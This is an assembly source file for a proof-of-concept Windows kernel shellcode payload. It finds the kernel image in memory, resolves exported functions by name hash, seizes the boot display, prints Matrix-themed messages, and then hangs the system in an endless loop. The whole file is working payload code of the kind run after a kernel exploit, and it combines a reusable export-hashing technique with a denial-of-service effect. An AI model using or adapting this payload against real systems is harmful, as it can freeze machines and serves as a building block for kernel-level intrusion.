; Kernel loader with ResetDisplay VGA Text Mode PoC
;  www.dontstuffbeansupyournose.com


CPU 686
BITS 32

    ; Not optimized for size, space, speed, or much of anything
    pushad
    mov ebx, [fs:0x34] ; KdVersionBlock in NTOSKRNL -> NOT VERIFIED this always points at NTOSKRNL
    mov edx, 0x1000
    ; page-align
    dec edx
    not edx
    and ebx, edx
    not edx
    inc edx
    
    ; ok, i got lazy here with register allocation, i'm bored of this, just import my funcs will ya!
    jmp functable
get_funcs:
    pop ebp
    ; this - terrible

    ; scan down a page at a time -- warning! imagine evil pe files....
    ; assumption: KdVersionBlock is > 0x1000 bytes from PE start
find_mz:
    sub ebx, edx
    ; find PE header -> NOT FOOLPROOF
    cmp word [ebx], 0x5a4d ; MZ
    jnz find_mz

gpa: ; on subsequent iterations some of the sanity checking is redundant if not perhaps dangerous...
    mov ecx, [ebx+0x3c] ; e_lfanew
    cmp ecx, edx
    ja find_mz ; ridonculous value, obviously bogus
    
    lea ecx, [ebx+ecx]
    cmp dword [ecx], 0x4550 ; PE\0\0
    jnz find_mz

    mov edi, [ecx+0x78] ; export directory
    add edi, ebx

    xor ecx, ecx
    
next_name:
    mov eax, [edi+0x20]             ; name table
    cdq                             ; clear out hash
    add eax, ebx

    mov esi, [eax+ecx*4]            ; grab name
    add esi, ebx

compute_hash:
    xor eax, eax
    lodsb                           ; grab byte
    test al, al
    jz got_hash
    
    ror edx, 0x9                    ; I'm so cool I use 9
    add edx, eax
    jmp compute_hash
    
got_hash:
    mov esi, [edi+0x24]             ; ordinal table
    add esi, ebx

    mov ax, [esi+ecx*2]             ; ordinal value
    mov esi, [edi+0x1c]             ; address table
    add esi, ebx
    
    mov eax, [esi+eax*4]
    add eax, ebx                    ; that's it! unless it's a forwarder
                                    ; we don't do forwarders

    inc ecx
    cmp edx, [ebp]                  ; did the hash actually match?
    jnz next_name                   ; no? try again
    mov [ebp], eax
    add ebp, 4
    mov eax, [ebp]
    test eax, eax
    jnz gpa
    jmp next_steps

rand:
    ; glibc rand
    mov eax, [ebp+(seed-ebp_place)]
    mov edx, 1103515245
    mul edx
    add eax, 12345
    mov [ebp+(seed-ebp_place)], eax
    retn
    
next_steps:    
    push eax
    push eax
    push esp
    call [ebp+(KeQueryTickCount-ebp_place)]
    pop dword [ebp+(seed-ebp_place)]
    pop eax

    ; now 'bluescreen' the box but do it cool!
    xor edi, edi
    call [ebp+(InbvAcquireDisplayOwnership-ebp_place)]

    lea esi, [ebp+(aWakeup-ebp_place)]
do_silliness:    
    call [ebp+(InbvResetDisplay-ebp_place)]

    ;  0 - black
    ;  1 - red
    ;  2 - green
    ;  3 - yellow
    ;  4 - blue
    ;  5 - purple
    ;  6 - cyan
    ;  7 - dk grey
    ;  8 - lt grey
    ;  9 - br red
    ; 10 - br green
    ; 11 - br yellow
    ; 12 - br blue
    ; 13 - br purple
    ; 14 - br cyan
    ; 15 - white
    push edi ; color (black)
    push dword 479 ; vert
    push dword 639 ; horiz
    push edi ; unk
    push edi ; unk
    call [ebp+(InbvSolidColorFill-ebp_place)]

    push byte 2 ; color (green)
    call [ebp+(InbvSetTextColor-ebp_place)]

    push edi ; unk
    call [ebp+(InbvInstallDisplayStringFilter-ebp_place)]

    push byte 1 ; bool
    call [ebp+(InbvEnableDisplayString-ebp_place)]

    push dword 400 ; vert
    push dword 639 ; horiz
    push edi ; unk
    push edi ; unk
    call [ebp+(InbvSetScrollRegion-ebp_place)]

display_string:
    push byte -1
    ; random delay .1 sec - .7 sec
    call rand
    xor edx, edx
    mov ecx, 6000000
    div ecx
    add edx, 1000000
    neg edx
    push edx
    push esp
    push edi
    push edi
    call [ebp+(KeDelayExecutionThread-ebp_place)]
    pop eax
    pop eax
    
    xor eax, eax
    lodsb
    test eax, eax
    jz done
    
    push eax
    push esp
    call [ebp+(InbvDisplayString-ebp_place)]
    jmp display_string
done:

    push byte -1
    push -20000000
    push esp
    push edi
    push edi
    call [ebp+(KeDelayExecutionThread-ebp_place)]
    pop eax
    pop eax

    mov al, [esi]
    test al, al
    jnz do_silliness

ebfe:
    jmp ebfe
    
functable:
    call get_funcs
InbvAcquireDisplayOwnership: dd 0x1c3ca822
InbvResetDisplay: dd 0xa280ca6b
InbvSolidColorFill: dd 0xe826d2b7
InbvSetTextColor: dd 0xb8da1a23
InbvInstallDisplayStringFilter: dd 0x3a077e32
InbvEnableDisplayString: dd 0x4156d471
InbvSetScrollRegion: dd 0x8d0a7756
InbvDisplayString: dd 0xe67901c6
KeDelayExecutionThread: dd 0xbdb06e5b
KeQueryTickCount: dd 0xfc06014b
ebp_place: dd 0
seed: dd 0
aWakeup: db "Wake up, Neo...",10,0
aTheMatrix: db "The Matrix has you...",10,0
aFollow: db "Follow the white rabbit.",10,0
rlydone: db 0
